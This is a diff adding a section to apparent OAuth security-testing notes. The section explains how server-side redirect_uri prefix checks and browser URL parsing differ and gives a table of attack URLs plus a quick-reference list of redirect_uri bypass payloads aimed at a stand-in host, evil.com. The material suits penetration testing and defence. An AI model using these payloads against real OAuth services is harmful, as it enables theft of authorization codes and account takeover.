@@ -797,4 +797,44 @@ for the attacker beyond hosting a web server.
 9. **Implement token binding** (DPoP - RFC 9449)
 10. **Enable Keycloak AuthorizationPolicy** at mesh level
 11. **Centralize OAuth config** via GitOps (prevent gateway drift)
+
+---
+
+## Browser-Parse vs Server-Parse: redirect_uri Prefix-Match Bypass
+
+A server-side prefix-match flaw on `redirect_uri` is **necessary but not sufficient** to land the OAuth code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another. Always confirm both before writing the finding as ATO.
+
+| Server validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
+|-----------------|-----------|----------------------|--------------------:|----------|
+| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (`@` is userinfo delimiter BEFORE first `/`) | **YES** |
+| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (`@` is AFTER first `/`, parsed as path char) | **NO** |
+| prefix = `https://acme.example` (substring) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension) | **YES** |
+| prefix = `https://acme.example/` (server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw | acme.example (path-normalized) | usually **NO** |
+| prefix = `https://acme.example/` (Chromium) | `https://acme.example/\@evil.com/cb` | passes | acme.example (Chromium converts `\` to `/`) | usually **NO** |
+
+**Key rule:** The WHATWG URL parser (all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character.
+
+**Operational rule:** Always headless-test (Playwright/Puppeteer/real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain. Server-side accept + browser-side stay-on-legitimate-host = NOT ATO.
+
+### redirect_uri Bypass Payloads (Quick Reference)
+
+```bash
+# Host confusion
+https://evil.com#legit.com
+https://legit.com.evil.com
+https://legit.com@evil.com
+
+# Path traversal
+https://legit.com/oauth/callback/../../redirect?url=https://evil.com
+
+# Open redirect chain (find open redirect on legit domain first)
+https://legit.com/logout?next=https://evil.com
+
+# Parameter pollution
+?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb
+
+# URL encoded slashes
+https://legit.com%2F@evil.com
+https://legit.com%252F..%252F..evil.com
+```
 12. **Add anomaly detection** on token endpoint (unusual grant types, rapid token exchange)
